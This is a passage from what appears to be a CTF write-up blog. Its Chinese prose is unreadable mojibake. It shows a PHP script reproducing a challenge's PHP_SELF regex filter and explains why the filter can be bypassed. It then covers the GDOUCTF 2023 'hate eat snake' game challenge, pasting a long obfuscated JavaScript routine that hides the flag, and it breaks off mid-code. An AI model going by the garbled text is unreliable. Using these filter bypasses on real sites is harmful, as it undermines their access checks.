<p>æ˜æ˜æˆ‘ä»¬çš„urlä¸­æœ‰utils.phpï¼Œä½†ä¸ºä»€ä¹ˆæ²¡æœ‰è§¦å‘è¿™ä¸ªæ­£åˆ™å‘¢ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯ååŒ¹é…(åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®)</p>
<p>å¯ä»¥ç”¨vpsæ¨¡æ‹Ÿä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹<br>æµ‹è¯•ä»£ç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><br><br>echo <span class="hljs-string">&quot;SERVER[&#x27;PHP_SELF&#x27;]   =  &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>];<br>echo <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>var_dump(preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    echo <span class="hljs-string">&#x27;basename = =&#x27;</span>.basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(__FILE__);<br>&#125;<br>?&gt; <br></code></pre></td></tr></table></figure>

<p><img src="/images/8546C70DBD82478dA964ADFBC67556C4.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="GDOUCTF-2023-hate-eat-snake"><a href="#GDOUCTF-2023-hate-eat-snake" class="headerlink" title="[GDOUCTF 2023]hate eat snake"></a>[GDOUCTF 2023]hate eat snake</h2><p>æ¸¸æˆé¢˜<br><img src="/images/4A2117B4B784427082E78CEA98CFD4FC.png" srcset="/img/loading.gif" lazyload><br>è¿™ç§ä¸€èˆ¬éƒ½æ˜¯jsï¼Œæ‰¾ä¸€ä¸‹flag<br>åœ¨snake.jsä¸­æ‰¾åˆ°<br><img src="/images/6846416A39CC4aea908BCAC145997748.png" srcset="/img/loading.gif" lazyload><br>è²Œä¼¼æ˜¯è‡ªå·±çš„å‡½æ•°åµŒå¥—åŠ å¯†ï¼Œjsä»£ç æ··æ·†<br>åœ¨ç½‘é¡µä¸Šæˆ‘ä»¬æ”¹ä¸äº†jsä»£ç ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠç½‘é¡µæ¬åˆ°æœ¬åœ°é‡Œ<br>ç„¶åæŠŠif(thisâ€™getScoreâ€™&gt;0)ï¼Œåˆ›é€ ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„æ¡ä»¶ï¼Œæœ¬åœ°è¿è¡Œ<br><img src="/images/9CCAFF648B8A4c50805D05687CF5A2F7.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ–è€…æŠŠé‚£ä¸€æ•´ä¸²åŠ å¯†å‡½æ•°å¤åˆ¶ä¸‹æ¥æ”¾åˆ°æ§åˆ¶å°ä¸Š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">function</span> _0x2615()&#123;var _0x30b7fe=[&#x27;C2vHCMnO&#x27;,&#x27;Dg9tDhjPBMC&#x27;,&#x27;DuLywKG&#x27;,&#x27;BgvUz3rO&#x27;,&#x27;CMv0DxjUicHMDq&#x27;,&#x27;y29UC29Szq&#x27;,&#x27;Aw5MBW&#x27;,&#x27;CM4GDgHPCYiPka&#x27;,&#x27;yvz6uuW&#x27;,&#x27;otuYnZiWwxDjwwHS&#x27;,&#x27;kcGOlISPkYKRkq&#x27;,&#x27;y29UC3rYDwn0BW&#x27;,&#x27;AZnYx2GWCgvFDa&#x27;,&#x27;ELvTAfO&#x27;,&#x27;Cu5JwK8&#x27;,&#x27;DvjNreK&#x27;,&#x27;zKHowxC&#x27;,&#x27;wwj5u3u&#x27;,&#x27;Aun1y2u&#x27;,&#x27;D2fYBG&#x27;,&#x27;AxjSzNjPzw5KFq&#x27;,&#x27;DuTYBhO&#x27;,&#x27;Eg5KCK4&#x27;,&#x27;A0viDfK&#x27;,&#x27;t1PAu04&#x27;,&#x27;wKDMC0O&#x27;,&#x27;yxbWBhK&#x27;,&#x27;C29huKO&#x27;,&#x27;ELbnu1a&#x27;,&#x27;sKnlqMu&#x27;,&#x27;mZq2ode4D1nKqvPl&#x27;,&#x27;B0fzAhy&#x27;,&#x27;C3bSAxq&#x27;,&#x27;nJiXmZCZmMXkqKvfwG&#x27;,&#x27;y3rVCIGICMv0Dq&#x27;,&#x27;BMn0Aw9UkcKG&#x27;,&#x27;mZe5odC1m0jfAfDJyG&#x27;,&#x27;ChjVDg90ExbL&#x27;,&#x27;zMLmywK&#x27;,&#x27;Bg9N&#x27;,&#x27;nZaWy1fIr1zd&#x27;,&#x27;sw16u0y&#x27;,&#x27;s2LOs0m&#x27;,&#x27;mZa2EfD0yNrK&#x27;,&#x27;x19WCM90B19F&#x27;,&#x27;qxbwC2y&#x27;,&#x27;zgPJrwG&#x27;,&#x27;EMPgDKG&#x27;,&#x27;uMjwufa&#x27;,&#x27;qvbHAMS&#x27;,&#x27;D21JtMu&#x27;,&#x27;yMLUza&#x27;,&#x27;mJe1mtbYsw9mqw0&#x27;,&#x27;zgzQELu&#x27;,&#x27;uNrItxe&#x27;,&#x27;mZKZmZuYCxvStLDN&#x27;,&#x27;mNWXFdb8nhW1Fa&#x27;,&#x27;vxLOBgS&#x27;,&#x27;tLntq1rgE0PFma&#x27;,&#x27;nta3mdi1ohnisvrvDq&#x27;,&#x27;s3nNzge&#x27;,&#x27;B19OyxzLx0bFzW&#x27;,&#x27;E30Uy29UC3rYDq&#x27;];_0x2615=function()&#123;return _0x30b7fe;&#125;;return _0x2615();&#125;(function(_0x9c05b6,_0x3cd1af)&#123;var _0x14de83=&#123;_0x2eff5d:<span class="hljs-number">0</span>x515,_0x379093:<span class="hljs-number">0</span>x517,_0x28a866:<span class="hljs-number">0</span>x4fb,_0x138c8b:<span class="hljs-number">0</span>x4d9,_0x44fc29:<span class="hljs-number">0</span>x4ea,_0x31227a:<span class="hljs-number">0</span>x4f8,_0x289b75:<span class="hljs-number">0</span>xbb,_0x5370c2:<span class="hljs-number">0</span>xc0,_0x5787b9:<span class="hljs-number">0</span>xd5,_0x1ad93d:<span class="hljs-number">0</span>xcd,_0xe984c4:<span class="hljs-number">0</span>xc6,_0x237902:<span class="hljs-number">0</span>xe9,_0x348752:<span class="hljs-number">0</span>xc5,_0x31acff:<span class="hljs-number">0</span>xc1,_0x29000f:<span class="hljs-number">0</span>xa9,_0x27647b:<span class="hljs-number">0</span>x52e,_0x460527:<span class="hljs-number">0</span>x535,_0x2aaf24:<span class="hljs-number">0</span>xd4,_0x399fbe:<span class="hljs-number">0</span>xd2,_0x6657d2:<span class="hljs-number">0</span>xcc,_0x374113:<span class="hljs-number">0</span>xbe,_0x971dcb:<span class="hljs-number">0</span>xbd,_0x2d75b0:<span class="hljs-number">0</span>xca,_0x27e959:<span class="hljs-number">0</span>xb5,_0x3154a8:<span class="hljs-number">0</span>xb9&#125;,_0x3d91c3=&#123;_0x2b5c86:<span class="hljs-number">0</span>x2a7&#125;,_0x2ef8df=&#123;_0xa9f18e:<span class="hljs-number">0</span>x32f&#125;;function _0x19c108(_0x40885c,_0xff529f,_0x5259a1,_0x44205b)&#123;return _0x3b1f(_0x5259a1-_0x2ef8df._0xa9f18e,_0xff529f);&#125;function _0x258a90(_0x130138,_0x35de99,_0x370399,_0x19391d)&#123;return _0x3b1f(_0x35de99- -_0x3d91c3._0x2b5c86,_0x19391d);&#125;var _0x4c122a=_0x9c05b6();while(!![])&#123;try&#123;var _0x2f5b83=parseInt(_0x19c108(_0x14de83._0x2eff5d,<span class="hljs-number">0</span>x515,<span class="hljs-number">0</span>x4ff,_0x14de83._0x379093))/(-<span class="hljs-number">0</span>x349*<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x3*<span class="hljs-number">0</span>xba7+<span class="hljs-number">0</span>x263f)+parseInt(_0x19c108(_0x14de83._0x28a866,_0x14de83._0x138c8b,_0x14de83._0x44fc29,_0x14de83._0x31227a))/(<span class="hljs-number">0</span>x156b+<span class="hljs-number">0</span>x8b*<span class="hljs-number">0</span>xe+-<span class="hljs-number">0</span>x1d03)+-parseInt(_0x258a90(-_0x14de83._0x289b75,-<span class="hljs-number">0</span>xd1,-<span class="hljs-number">0</span>xe4,-_0x14de83._0x5370c2))/(<span class="hljs-number">0</span>x655*-<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x76*<span class="hljs-number">0</span>x15+<span class="hljs-number">0</span>x1006)+parseInt(_0x258a90(-_0x14de83._0x5787b9,-_0x14de83._0x1ad93d,-_0x14de83._0xe984c4,-_0x14de83._0x237902))/(-<span class="hljs-number">0</span>x2028+<span class="hljs-number">0</span>xecd*-<span class="hljs-number">0</span>x1+<span class="hljs-number">0</span>x2ef9)*(parseInt(_0x258a90(-_0x14de83._0x348752,-_0x14de83._0x31acff,-_0x14de83._0x29000f,-<span class="hljs-number">0</span>xa2))/(<span class="hljs-number">0</span>xb4e*-<span class="hljs-number">0</span>x1+<span class="hljs-number">0</span>x1236+-<span class="hljs-number">0</span>x2b*<span class="hljs-number">0</span>x29))+parseInt(_0x19c108(_0x14de83._0x27647b,_0x14de83._0x460527,<span class="hljs-number">0</span>x51c,<span class="hljs-number">0</span>x536))/(-<span class="hljs-number">0</span>x22ad+-<span class="hljs-number">0</span>x925+<span class="hljs-number">0</span>x8*<span class="hljs-number">0</span>x57b)+parseInt(_0x258a90(-<span class="hljs-number">0</span>xd9,-_0x14de83._0x2aaf24,-_0x14de83._0x399fbe,-_0x14de83._0x2aaf24))/(-<span class="hljs-number">0</span>x564+-<span class="hljs-number">0</span>x2664+<span class="hljs-number">0</span>x2bcf)+parseInt(_0x258a90(-_0x14de83._0x6657d2,-_0x14de83._0x374113,-<span class="hljs-number">0</span>xa9,-<span class="hljs-number">0</span>xcd))/(-<span class="hljs-number">0</span>x178*-<span class="hljs-number">0</span>x8+-<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>x2af+<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>xe67)*(-parseInt(_0x258a90(-_0x14de83._0x971dcb,-_0x14de83._0x2d75b0,-_0x14de83._0x27e959,-_0x14de83._0x3154a8))/(<span class="hljs-number">0</span>x837+-<span class="hljs-number">0</span>x7b9+-<span class="hljs-number">0</span>xd*<span class="hljs-number">0</span>x9));if(_0x2f5b83===_0x3cd1af)break;else _0x4c122a[&#x27;push&#x27;](_0x4c122a[&#x27;shift&#x27;]());&#125;catch(_0x37c27d)&#123;_0x4c122a[&#x27;push&#x27;](_0x4c122a[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x2615,-<span class="hljs-number">0</span>x1d40d+<span class="hljs-number">0</span>x5e216*-<span class="hljs-number">0</span>x2+<span class="hljs-number">0</span>x164db7));function _0x3b1f(_0x13dbeb,_0x5cc9c2)&#123;var _0x9dd244=_0x2615();return _0x3b1f=function(_0x6bb205,_0x1a837a)&#123;_0x6bb205=_0x6bb205-(-<span class="hljs-number">0</span>xa10+-<span class="hljs-number">0</span>xf4e+<span class="hljs-number">0</span>x1b11);var _0x4a9901=_0x9dd244[_0x6bb205];if(_0x3b1f[&#x27;ezcADE&#x27;]===undefined)&#123;var _0x737fa1=function(_0xdd69cc)&#123;var _0x32b23a=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&#x27;;var _0x291519=&#x27;&#x27;,_0xe543a9=&#x27;&#x27;,_0x56d82c=_0x291519+_0x737fa1;for(var _0x38d1b8=<span class="hljs-number">0</span>x1493+-<span class="hljs-number">0</span>xf22+-<span class="hljs-number">0</span>x571,_0x20fe78,_0x2e67a2,_0x112ad9=<span class="hljs-number">0</span>x95f*<span class="hljs-number">0</span>x1+<span class="hljs-number">0</span>x17*-<span class="hljs-number">0</span>x11d+<span class="hljs-number">0</span>x103c;_0x2e67a2=_0xdd69cc[&#x27;charAt&#x27;](_0x112ad9++);~_0x2e67a2&amp;&amp;(_0x20fe78=_0x38d1b8%(<span class="hljs-number">0</span>x2248+<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>x249e+-<span class="hljs-number">0</span>x2b*-<span class="hljs-number">0</span>xe)?_0x20fe78*(-<span class="hljs-number">0</span>x11e2+-<span class="hljs-number">0</span>x12*-<span class="hljs-number">0</span>x13e+-<span class="hljs-number">0</span>x43a)+_0x2e67a2:_0x2e67a2,_0x38d1b8++%(<span class="hljs-number">0</span>x15f8+<span class="hljs-number">0</span>x4*<span class="hljs-number">0</span>x5db+<span class="hljs-number">0</span>xb0*-<span class="hljs-number">0</span>x42))?_0x291519+=_0x56d82c[&#x27;charCodeAt&#x27;](_0x112ad9+(-<span class="hljs-number">0</span>x17*<span class="hljs-number">0</span>x13+-<span class="hljs-number">0</span>xbe4+<span class="hljs-number">0</span>x1*<span class="hljs-number">0</span>xda3))-(<span class="hljs-number">0</span>x1a*<span class="hljs-number">0</span>x112+<span class="hljs-number">0</span>x256*<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x1e20*<span class="hljs-number">0</span>x1)!==-<span class="hljs-number">0</span>xd32+-<span class="hljs-number">0</span>x1*<span class="hljs-number">0</span>x7f3+<span class="hljs-number">0</span>x1*<span class="hljs-number">0</span>x1525?String[&#x27;fromCharCode&#x27;](-<span class="hljs-number">0</span>x21b6+<span class="hljs-number">0</span>x2686+-<span class="hljs-number">0</span>x3d1&amp;_0x20fe78&gt;&gt;(-(<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>x1174+<span class="hljs-number">0</span>x17c4+-<span class="hljs-number">0</span>x64e)*_0x38d1b8&amp;<span class="hljs-number">0</span>x956+-<span class="hljs-number">0</span>x1e86+<span class="hljs-number">0</span>xf*<span class="hljs-number">0</span>x16a)):_0x38d1b8:<span class="hljs-number">0</span>x9b*-<span class="hljs-number">0</span>xb+<span class="hljs-number">0</span>xaa9*<span class="hljs-number">0</span>x2+-<span class="hljs-number">0</span>xea9)&#123;_0x2e67a2=_0x32b23a[&#x27;indexOf&#x27;](_0x2e67a2);&#125;for(var _0x399c03=<span class="hljs-number">0</span>x25*<span class="hljs-number">0</span>x86+-<span class="hljs-number">0</span>x5*<span class="hljs-number">0</span>xeb+-<span class="hljs-number">0</span>xec7,_0x268f6f=_0x291519[&#x27;length&#x27;];_0x399c03&lt;_0x268f6f;_0x399c03++)&#123;_0xe543a9+=&#x27;%&#x27;+(&#x27;<span class="hljs-number">00</span>&#x27;+_0x291519[&#x27;charCodeAt&#x27;](_0x399c03)[&#x27;toString&#x27;](-<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>x1db8+-<span class="hljs-number">0</span>x142*-<span class="hljs-number">0</span>xf+-<span class="hljs-number">0</span>x3086))[&#x27;slice&#x27;](-(-<span class="hljs-number">0</span>x121b+<span class="hljs-number">0</span>x2418+-<span class="hljs-number">0</span>x11fb));&#125;return decodeURIComponent(_0xe543a9);&#125;;_0x3b1f[&#x27;gtGaaQ&#x27;]=_0x737fa1,_0x13dbeb=arguments,_0x3b1f[&#x27;ezcADE&#x27;]=!![];&#125;var _0x10cea4=_0x9dd244[<span class="hljs-number">0</span>x4*<span class="hljs-number">0</span>x485+<span class="hljs-number">0</span>xd15+-<span class="hljs-number">0</span>x3*<span class="hljs-number">0</span>xa63],_0x43aebe=_0x6bb205+_0x10cea4,_0x372eb9=_0x13dbeb[_0x43aebe];if(!_0x372eb9)&#123;var _0x3e361c=function(_0x45f181)&#123;this[&#x27;YdeqDM&#x27;]=_0x45f181,this[&#x27;ZwSuYW&#x27;]=[-<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>xed7+-<span class="hljs-number">0</span>x1575*<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>x69f,-<span class="hljs-number">0</span>x5e*<span class="hljs-number">0</span>x35+-<span class="hljs-number">0</span>x1e0+<span class="hljs-number">0</span>x1556,-<span class="hljs-number">0</span>x1428+-<span class="hljs-number">0</span>x1*<span class="hljs-number">0</span>x2c1+<span class="hljs-number">0</span>x16e9],this[&#x27;LxWuRS&#x27;]=function()&#123;return&#x27;newState&#x27;;&#125;,this[&#x27;ZvCcme&#x27;]=&#x27;\x5cw+\x20*\x5c(\x5c)\x20*&#123;\x5cw+\x20*&#x27;,this[&#x27;yEXhLw&#x27;]=&#x27;[\x27|\x22].+[\x27|\x22];?\x20*&#125;&#x27;;&#125;;_0x3e361c[&#x27;prototype&#x27;][&#x27;lGgayY&#x27;]=function()&#123;var _0x1111a8=new RegExp(this[&#x27;ZvCcme&#x27;]+this[&#x27;yEXhLw&#x27;]),_0x18a410=_0x1111a8[&#x27;test&#x27;](this[&#x27;LxWuRS&#x27;][&#x27;toString&#x27;]())?--this[&#x27;ZwSuYW&#x27;][<span class="hljs-number">0</span>x2b3*-<span class="hljs-number">0</span>xd+-<span class="hljs-number">0</span>x8ab+<span class="hljs-number">0</span>x2bc3]:--this[&#x27;ZwSuYW&#x27;][-<span class="hljs-number">0</span>x427*<span class="hljs-number">0</span>x1+<span class="hljs-number">0</span>x248a+-<span class="hljs-number">0</span>x2063];return this[&#x27;dFEYfX&#x27;](_0x18a410);&#125;,_0x3e361c[&#x27;prototype&#x27;][&#x27;dFEYfX&#x27;]=function(_0x29be5c)&#123;if(!Boolean(~_0x29be5c))return _0x29be5c;return this[&#x27;QPabUn&#x27;](this[&#x27;YdeqDM&#x27;]);&#125;,_0x3e361c[&#x27;prototype&#x27;][&#x27;QPabUn&#x27;]=function(_0x400659)&#123;for(var _0x56e46c=-<span class="hljs-number">0</span>x947+-<span class="hljs-number">0</span>x1c0e+-<span class="hljs-number">0</span>x13*-<span class="hljs-number">0</span>x1f7,_0x137603=this[&#x27;ZwSuYW&#x27;][&#x27;length&#x27;];_0x56e46c&lt;_0x137603;_0x56e46c++)&#123;this[&#x27;ZwSuYW&#x27;][&#x27;push&#x27;](Math[&#x27;round&#x27;](Math[&#x27;random&#x27;]())),_0x137603=this[&#x27;ZwSuYW&#x27;][&#x27;length&#x27;];&#125;return _0x400659(this[&#x27;ZwSuYW&#x27;][-<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>x1c8b+<span class="hljs-number">0</span>x574+-<span class="hljs-number">0</span>x21ff]);&#125;,new _0x3e361c(_0x3b1f)[&#x27;lGgayY&#x27;](),_0x4a9901=_0x3b1f[&#x27;gtGaaQ&#x27;](_0x4a9901),_0x13dbeb[_0x43aebe]=_0x4a9901;&#125;else _0x4a9901=_0x372eb9;return _0x4a9901;&#125;,_0x3b1f(_0x13dbeb,_0x5cc9c2);&#125;var _0xe3a40f=(function()&#123;var _0xa08eff=&#123;_0x4ef0ad:<span class="hljs-number">0</span>x132,_0x22ef19:<span class="hljs-number">0</span>x13d,_0x2bc994:<span class="hljs-number">0</span>x10a,_0x572812:<span class="hljs-number">0</span>x12a,_0x265475:<span class="hljs-number">0</span>x153,_0x4a1f2d:<span class="hljs-number">0</span>x169,_0x47ee9e:<span class="hljs-number">0</span>x143,_0x36b087:<span class="hljs-number">0</span>x14a,_0x24c4fe:<span class="hljs-number">0</span>x93,_0x1b2ec9:<span class="hljs-number">0</span>xaf,_0x417b61:<span class="hljs-number">0</span>x94,_0xca6d53:<span class="hljs-number">0</span>x99,_0x17a7c5:<span class="hljs-number">0</span>xb2,_0x54f6fb:<span class="hljs-number">0</span>xa2,_0x37e0ba:<span class="hljs-number">0</span>xaa,_0x3bf4f1:<span class="hljs-number">0</span>xc0,_0x3d4138:<span class="hljs-number">0</span>x13b,_0x5e7f7e:<span class="hljs-number">0</span>x11b&#125;,_0x23f48c=&#123;_0x45fca3:<span class="hljs-number">0</span>x1e3,_0x388cc1:<span class="hljs-number">0</span>x1ee,_0x52ef39:<span class="hljs-number">0</span>x1cf,_0x46a0ad:<span class="hljs-number">0</span>x1ce,_0x147ee6:<span class="hljs-number">0</span>x1c2&#125;,_0x3655fa=&#123;_0x295058:<span class="hljs-number">0</span>x29f,_0x3260c2:<span class="hljs-number">0</span>x2b8,_0x2fde01:<span class="hljs-number">0</span>x2b5,_0x41dea7:<span class="hljs-number">0</span>x2c0,_0x44620a:<span class="hljs-number">0</span>x2cc,_0x310c84:<span class="hljs-number">0</span>x2b9&#125;,_0x40c435=&#123;_0x114861:<span class="hljs-number">0</span>x312&#125;,_0x3f94c6=&#123;&#125;;_0x3f94c6[_0x47cdc4(-_0xa08eff._0x4ef0ad,-_0xa08eff._0x22ef19,-_0xa08eff._0x2bc994,-_0xa08eff._0x572812)]=&#x27;tSnSD&#x27;;function _0x47cdc4(_0x407d27,_0x519718,_0x55f154,_0x2e3d6d)&#123;return _0x3b1f(_0x2e3d6d- -_0x40c435._0x114861,_0x407d27);&#125;_0x3f94c6[_0x47cdc4(-_0xa08eff._0x265475,-_0xa08eff._0x4a1f2d,-_0xa08eff._0x47ee9e,-_0xa08eff._0x36b087)]=_0x17f6d4(-_0xa08eff._0x24c4fe,-_0xa08eff._0x1b2ec9,-_0xa08eff._0x417b61,-<span class="hljs-number">0</span>x85),_0x3f94c6[_0x17f6d4(-_0xa08eff._0xca6d53,-<span class="hljs-number">0</span>xab,-<span class="hljs-number">0</span>x9b,-_0xa08eff._0x17a7c5)]=function(_0x46e4eb,_0x351c7f)&#123;return _0x46e4eb!==_0x351c7f;&#125;,_0x3f94c6[_0x17f6d4(-_0xa08eff._0x54f6fb,-_0xa08eff._0x37e0ba,-<span class="hljs-number">0</span>xbf,-_0xa08eff._0x3bf4f1)]=_0x47cdc4(-_0xa08eff._0x3d4138,-_0xa08eff._0x5e7f7e,-<span class="hljs-number">0</span>x14d,-_0xa08eff._0x4ef0ad);function _0x17f6d4(_0x3f62ee,_0x475c98,_0xe91d2a,_0x16640e)&#123;return _0x3b1f(_0xe91d2a- -<span class="hljs-number">0</span>x282,_0x475c98);&#125;var _0x58a5c3=_0x3f94c6,_0x2b2d86=!![];return function(_0x58f58f,_0x155082)&#123;var _0x29b99c=&#123;_0x5b3b43:<span class="hljs-number">0</span>x17b,_0x4ed988:<span class="hljs-number">0</span>xf6&#125;,_0x3ea797=&#123;_0x5f5192:<span class="hljs-number">0</span>x174,_0x2817be:<span class="hljs-number">0</span>xd8&#125;,_0x53d249=&#123;_0x2b52f7:<span class="hljs-number">0</span>x4c,_0x55cf12:<span class="hljs-number">0</span>x28d,_0x1ea0e4:<span class="hljs-number">0</span>x66&#125;,_0x478556=&#123;_0x590b31:<span class="hljs-number">0</span>x154,_0x4ad502:<span class="hljs-number">0</span>x3a2,_0x5de42d:<span class="hljs-number">0</span>x53&#125;;function _0x1f4917(_0x598525,_0x58ffdb,_0x475520,_0x9449f2)&#123;return _0x17f6d4(_0x598525-_0x478556._0x590b31,_0x598525,_0x475520-_0x478556._0x4ad502,_0x9449f2-_0x478556._0x5de42d);&#125;function _0x1f060f(_0x4c2543,_0x16ffc7,_0x202b3d,_0x498f7a)&#123;return _0x17f6d4(_0x4c2543-_0x53d249._0x2b52f7,_0x4c2543,_0x202b3d-_0x53d249._0x55cf12,_0x498f7a-_0x53d249._0x1ea0e4);&#125;if(_0x58a5c3[_0x1f060f(<span class="hljs-number">0</span>x1d9,_0x23f48c._0x45fca3,<span class="hljs-number">0</span>x1f2,_0x23f48c._0x388cc1)](_0x58a5c3[_0x1f060f(_0x23f48c._0x52ef39,<span class="hljs-number">0</span>x1b7,_0x23f48c._0x46a0ad,_0x23f48c._0x147ee6)],&#x27;djcEh&#x27;))&#123;var _0x121d40=&#123;_0x399041:<span class="hljs-number">0</span>x48f,_0xda48dd:<span class="hljs-number">0</span>x4b5,_0x12c9aa:<span class="hljs-number">0</span>x4a3&#125;,_0x9c5d2b=&#123;_0x13395d:<span class="hljs-number">0</span>xb5,_0x2ba18c:<span class="hljs-number">0</span>x1b7&#125;,_0x299386=_0x140454?function()&#123;function _0xe54654(_0xff35d7,_0x2eabec,_0xf0fba7,_0x56791e)&#123;return _0x1f4917(_0xf0fba7,_0x2eabec-_0x9c5d2b._0x13395d,_0x56791e-_0x9c5d2b._0x2ba18c,_0x56791e-<span class="hljs-number">0</span>x11a);&#125;if(_0x241793)&#123;var _0x9ba59f=_0x5f5c1b[_0xe54654(_0x121d40._0x399041,<span class="hljs-number">0</span>x4a9,_0x121d40._0xda48dd,_0x121d40._0x12c9aa)](_0x4746f1,arguments);return _0x4e1409=null,_0x9ba59f;&#125;&#125;:function()&#123;&#125;;return _0x1fdeb7=![],_0x299386;&#125;else&#123;var _0x4c214f=_0x2b2d86?function()&#123;function _0x269dd1(_0x551565,_0x4fb373,_0x5317a2,_0x2480fc)&#123;return _0x1f4917(_0x551565,_0x4fb373-_0x3ea797._0x5f5192,_0x4fb373-<span class="hljs-number">0</span>x273,_0x2480fc-_0x3ea797._0x2817be);&#125;function _0x39ec60(_0x150153,_0x5d49c2,_0x418287,_0x57aad6)&#123;return _0x1f060f(_0x5d49c2,_0x5d49c2-_0x29b99c._0x5b3b43,_0x418287-<span class="hljs-number">0</span>xe2,_0x57aad6-_0x29b99c._0x4ed988);&#125;if(_0x58a5c3[&#x27;RtbMq&#x27;]!==_0x58a5c3[_0x39ec60(_0x3655fa._0x295058,_0x3655fa._0x3260c2,_0x3655fa._0x2fde01,_0x3655fa._0x41dea7)])&#123;if(_0x155082)&#123;var _0x14cc2a=_0x155082[_0x39ec60(<span class="hljs-number">0</span>x2bd,_0x3655fa._0x44620a,_0x3655fa._0x310c84,<span class="hljs-number">0</span>x29f)](_0x58f58f,arguments);return _0x155082=null,_0x14cc2a;&#125;&#125;else&#123;var _0x34fb23=_0x34f28e?function()&#123;if(_0x102b00)&#123;var _0x7d04e0=_0x49b548[&#x27;apply&#x27;](_0x544e8c,arguments);return _0x4e84cf=null,_0x7d04e0;&#125;&#125;:function()&#123;&#125;;return _0x2019d8=![],_0x34fb23;&#125;&#125;:function()&#123;&#125;;return _0x2b2d86=![],_0x4c214f;&#125;&#125;;&#125;()),_0x9d6323=_0xe3a40f(this,function()&#123;var _0x3e95=&#123;_0x308ee1:<span class="hljs-number">0</span>xf,_0x3b3319:<span class="hljs-number">0</span>x19,_0x2164b1:<span class="hljs-number">0</span>x41,_0x3fb1c9:<span class="hljs-number">0</span>x37,_0x438b66:<span class="hljs-number">0</span>x44,_0x1fdf8c:<span class="hljs-number">0</span>x14,_0x50244f:<span class="hljs-number">0</span>x7,_0x336362:<span class="hljs-number">0</span>x21,_0x32496e:<span class="hljs-number">0</span>x39,_0x160f93:<span class="hljs-number">0</span>x37,_0xbb9faa:<span class="hljs-number">0</span>x54,_0x23bbeb:<span class="hljs-number">0</span>x2d,_0x51d26b:<span class="hljs-number">0</span>x16,_0x65072d:<span class="hljs-number">0</span>x26,_0x188b75:<span class="hljs-number">0</span>xe,_0x30008e:<span class="hljs-number">0</span>x3,_0x1aab7d:<span class="hljs-number">0</span>x18,_0x3b2c72:<span class="hljs-number">0</span>x1a,_0xf0b648:<span class="hljs-number">0</span>x37,_0xba4d7:<span class="hljs-number">0</span>x50,_0x377e40:<span class="hljs-number">0</span>x27,_0x5b4725:<span class="hljs-number">0</span>x2f,_0x435c34:<span class="hljs-number">0</span>x17,_0x4fd6df:<span class="hljs-number">0</span>xd&#125;,_0x387847=&#123;_0x35bca4:<span class="hljs-number">0</span>x17b&#125;,_0x308184=&#123;&#125;;_0x308184[_0xe0b24e(_0x3e95._0x308ee1,<span class="hljs-number">0</span>x17,<span class="hljs-number">0</span>x2,_0x3e95._0x3b3319)]=_0x22aa6e(<span class="hljs-number">0</span>x2d,_0x3e95._0x2164b1,_0x3e95._0x3fb1c9,_0x3e95._0x438b66)+&#x27;+$&#x27;;function _0xe0b24e(_0x5d8370,_0x47708a,_0x9bf602,_0x161491)&#123;return _0x3b1f(_0x47708a- -<span class="hljs-number">0</span>x1ba,_0x161491);&#125;var _0x186c58=_0x308184;function 